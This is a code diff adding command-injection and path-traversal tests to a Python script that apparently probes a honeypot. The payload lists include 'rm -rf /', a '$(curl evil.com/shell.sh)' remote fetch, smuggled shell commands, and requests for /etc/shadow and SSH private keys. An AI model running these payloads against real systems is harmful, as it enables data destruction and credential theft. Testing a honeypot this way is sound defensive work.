@@ -104,6 +104,50 @@ def test_xss_attacks():
             print(f"  ✗ Error: {e}")
     print()
 
+def test_command_injection():
+    print("[*] Testing Command Injection Attacks (CRITICAL)...")
+    
+    cmd_payloads = [
+        {"cmd": "rm -rf /"},
+        {"cmd": "cat /etc/passwd"},
+        {"cmd": "; ls -la"},
+        {"cmd": "| whoami"},
+        {"cmd": "$(curl evil.com/shell.sh)"},
+    ]
+    
+    for payload in cmd_payloads:
+        try:
+            response = requests.post(
+                f"{HONEYPOT_URL}/api/exec",
+                json=payload,
+                headers={"Content-Type": "application/json"}
+            )
+            print(f"  ✓ Command Injection: {payload['cmd'][:30]}... [{response.status_code}]")
+            time.sleep(0.5)
+        except Exception as e:
+            print(f"  ✗ Error: {e}")
+    print()
+
+def test_path_traversal():
+    print("[*] Testing Path Traversal Attacks (CRITICAL)...")
+    
+    paths = [
+        "/../../etc/passwd",
+        "/../../../etc/shadow",
+        "/files/../../../../etc/hosts",
+        "/.ssh/id_rsa",
+        "/../../var/log/auth.log",
+    ]
+    
+    for path in paths:
+        try:
+            response = requests.get(f"{HONEYPOT_URL}{path}")
+            print(f"  ✓ Path Traversal: {path[:40]}... [{response.status_code}]")
+            time.sleep(0.5)
+        except Exception as e:
+            print(f"  ✗ Error: {e}")
+    print()
+
 def main():
     print_banner()
     
@@ -123,6 +167,8 @@ def main():
     test_admin_login()
     test_ssh_brute_force()
     test_xss_attacks()
+    test_command_injection()
+    test_path_traversal()
     
     end_time = datetime.now()
     duration = (end_time - start_time).total_seconds()
